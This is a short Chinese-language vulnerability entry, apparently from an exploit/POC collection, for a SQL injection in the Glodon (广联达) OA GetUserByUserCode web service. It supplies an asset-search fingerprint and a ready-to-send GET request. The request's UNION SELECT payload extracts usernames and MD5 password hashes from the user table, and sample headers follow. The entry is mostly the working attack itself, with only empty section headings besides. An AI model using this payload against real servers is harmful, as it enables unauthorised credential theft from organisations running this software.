# 广联达OAGetUserByUserCodeSQL注入漏洞

- **系统**：广联达OAGetUserByUserCode　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`GET /Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20top%201%20concat(F_CODE,%27:%27,F_PWD_MD5)%20from%20T_ORG_USER),NULL,NULL--+ HTTP/1.1`

**请求体 / payload**
```
可通过POC获取存在账号密码的MD5值
Host: xx.xx.xx.xx
Cookie: GTP_IdServer_LangID=2052; ASP.NET_SessionId=0qojkq03bxdprdshup5xd1pq
>
```

**其他**
- 广联达OA GetUserByUserCode SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA